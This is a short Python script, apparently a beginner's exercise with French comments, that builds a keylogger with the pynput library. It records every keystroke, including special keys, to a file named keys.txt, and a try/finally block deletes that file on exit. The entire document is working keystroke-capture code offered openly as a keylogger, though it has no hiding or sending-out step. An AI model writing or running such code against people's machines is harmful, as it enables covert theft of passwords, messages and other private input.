# script to build a keylogger - V2 - with try & cacth

from pynput import keyboard
import os

log_file = "keys.txt"

def on_press(key):
    with open(log_file, "a") as f:
        # hasattr() permet de vérifier si un objet a un attribut donné
        if hasattr(key, 'char') and key.char is not None:
            f.write(key.char)  # Enregistre la touche normale
        else:
            f.write(f" [{key}] ")  # Enregistre les touches spéciales (Ctrl, Shift...)



try:
    # Détecteur de clavier
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()
except:
    print("This will cause a problem")
finally:
    print("This will always execute.")
    os.remove(log_file)

